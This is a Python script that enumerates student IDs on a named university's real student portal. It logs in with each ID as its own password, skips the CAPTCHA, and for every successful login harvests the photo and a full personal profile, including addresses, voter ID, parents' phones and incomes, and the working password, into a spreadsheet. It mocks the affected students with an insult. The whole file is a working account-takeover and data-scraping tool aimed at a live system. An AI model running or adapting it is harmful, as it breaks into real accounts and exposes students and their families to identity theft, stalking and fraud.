import requests
from openpyxl import Workbook
from openpyxl.styles import PatternFill
from datetime import datetime
import base64
import os

bokacoda = 0
total_students = 0
image_download = False

def fetch_student_info(payload, headers):
    url_info = "http://software.diu.edu.bd:8006/result/studentInfo"
    params = {"studentId": payload["password"]}
    response_info = requests.get(url_info, headers=headers, params=params)
    if response_info.status_code == 200:
        return response_info.json()
    else:
        return None

def download_photo(access_token, output_filename):
    url = "http://software.diu.edu.bd:8006/profileUpdate/photograph"
    headers = {
        "accesstoken": access_token,
        "Referer": "http://studentportal.diu.edu.bd/",
        "Origin": "http://studentportal.diu.edu.bd"
    }

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        base64_data = response.content
        if base64_data == b'ZmlsZSBub3QgZm91bmQ=':
            return
        global image_download
        image_download = True
        image_data = base64.b64decode(base64_data)
        with open(output_filename, "wb") as f:
            f.write(image_data)
        print("Photo downloaded successfully.")
    else:
        print(f"Failed to download photo. Status code: {response.status_code}")

def check(payload, ws):
    headers = {
        "Content-Type": "application/json",
        "Origin": "http://studentportal.diu.edu.bd",
        "Referer": "http://studentportal.diu.edu.bd/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    url_login = "http://software.diu.edu.bd:8006/login"

    try:
        response_login = requests.post(url_login, json=payload, headers=headers)
        data_login = response_login.json()
        student_info = fetch_student_info(payload, headers)

        if student_info['studentId'!=None]:  # Check if student_info is not empty
            row_fill_color = "f70d1a"  # Default to failed color
            print(student_info)

            if data_login["message"] == "success":
                Access_token = data_login["accessToken"]
                url = "http://software.diu.edu.bd:8006/profile/studentInfo"
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                    "Accesstoken": Access_token,
                    "Content-Type": "application/json",
                    "Referer": "http://studentportal.diu.edu.bd/",
                    "Origin": "http://studentportal.diu.edu.bd",
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Connection": "keep-alive"
                }

                response_access = requests.get(url, headers=headers)
                Access_token_data = response_access.json()

                id = student_info["studentId"]
                image_filename = os.path.join(image_dir, f"{id}.jpg")
                download_photo(Access_token, image_filename)
                global image_download
                image_info = "Failed"
                if image_download:
                    image_info = "Success"
                    image_download = False  # Reset the flag for the next student

                row = [
                    "Success",
                    image_info,
                    student_info["studentName"],
                    student_info["studentId"],
                    payload["password"],  # Student Portal Password
                    student_info["departmentName"],
                    student_info["batchId"],
                    student_info["shift"],
                    Access_token_data["sex"],
                    Access_token_data["bloodGroup"],
                    Access_token_data["birthDate"],
                    Access_token_data["religion"],
                    Access_token_data["email"],
                    Access_token_data["emailAlternative"],
                    Access_token_data["mobile"],
                    Access_token_data["presentHouse"],
                    Access_token_data["presentZipCode"],
                    Access_token_data["permanentHouse"],
                    Access_token_data["permanentZipCode"],
                    Access_token_data["fatherName"],
                    Access_token_data["motherName"],
                    Access_token_data["maritalStatus"],
                    Access_token_data["nationality"],
                    Access_token_data["voterId"],
                    Access_token_data["fatherMobile"],
                    Access_token_data["fatherOccupation"],
                    Access_token_data["fatherAnnualIncome"],
                    Access_token_data["motherMobile"],
                    Access_token_data["motherOccupation"],
                    Access_token_data["motherAnnualIncome"],
                    Access_token_data["localGuardianName"],
                    Access_token_data["localGuardianMobile"],
                    Access_token_data["localGuardianRelation"],
                ]
                row_fill_color = "007d51"  # Green color for having Student Portal Password
                global bokacoda
                bokacoda += 1

            else:
                row = [
                    "Failed",
                    "Failed",
                    student_info["studentName"],
                    student_info["studentId"],
                    "",  # Student Portal Password
                    student_info["departmentName"],
                    student_info["batchId"],
                    student_info["shift"],
                    "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""
                ]

            ws.append(row)

            if len(ws._cells) > 7:  # Check if worksheet has more than headers
                for cell in ws[ws.max_row]:
                    cell.fill = PatternFill(start_color=row_fill_color, end_color=row_fill_color, fill_type="solid")

    except Exception as e:
        pass

        

def main():
    choice = int(input("Enter '1' for a single search or '2' for a range-based search: "))

    wb = Workbook()
    ws = wb.active
    additional_headers = [
        "Sex", 
        "Blood Group", 
        "Birth Date", 
        "Religion", 
        "Email", 
        "EmailAlternative",
        "Mobile", 
        "Present House", 
        "Present Zip Code", 
        "Permanent House", 
        "Permanent Zip Code", 
        "Father Name", 
        "Mother Name", 
        "Marital Status", 
        "Nationality", 
        "Voter ID", 
        "Father Mobile", 
        "Father Occupation", 
        "Father Annual Income", 
        "Mother Mobile", 
        "Mother Occupation", 
        "Mother Annual Income", 
        "Local Guardian Name", 
        "Local Guardian Mobile", 
        "Local Guardian Relation"
    ]

    ws.append(["Status", "Image Download", "Name", "Student ID", "Student Portal Password", "Department", "Batch", "Shift"] + additional_headers)  # Headers

    global total_students

    if choice == 1:
        Id = input("Please enter the ID: ")
        payload = {
            "username": f"{Id}",
            "password": f"{Id}",
            "grecaptcha": ""
        }
        check(payload, ws)
        total_students += 1
    elif choice == 2:
        Batch_code = input("Please enter the Batch Code: ")
        Dept_code = input("Please enter the Department Code: ")
        id_range_lower_bound = input("Please enter the Lower Bound ID: ")
        id_range_upper_bound = input("Please enter the Upper Bound ID: ")
        print("\nProcessing range-based search...")

        # Create a directory with a timestamp
        current_time = datetime.now().strftime("%Y-%m-%d-%H-%M")
        dir_name = f"{Batch_code}-{Dept_code}-{current_time}"
        os.makedirs(dir_name)

        # Create a subdirectory for images
        global image_dir
        image_dir = os.path.join(dir_name, "images")
        os.makedirs(image_dir)

        for id in range(int(id_range_lower_bound), int(id_range_upper_bound) + 1):
            payload = {
                "username": f"{Batch_code}-{Dept_code}-{str(id)}",
                "password": f"{Batch_code}-{Dept_code}-{str(id)}",
                "grecaptcha": ""
            }
            check(payload, ws)
            print(id)
            total_students += 1

    boka_percentage = (bokacoda / total_students) * 100 if total_students > 0 else 0
    summary_row = [
        f"Number of Students Processed: {total_students}",
        f"Number of Bokacoda: {bokacoda}",
        f"Bokacoda Percentage: {boka_percentage:.2f}%"
    ]
    ws.append(summary_row)

    filename = os.path.join(dir_name, f"{Batch_code}-{Dept_code}-{id_range_lower_bound}_to_{id_range_upper_bound}.xlsx")
    wb.save(filename)
    print(f"Excel file saved as: {filename}")

if __name__ == "__main__":
    main()
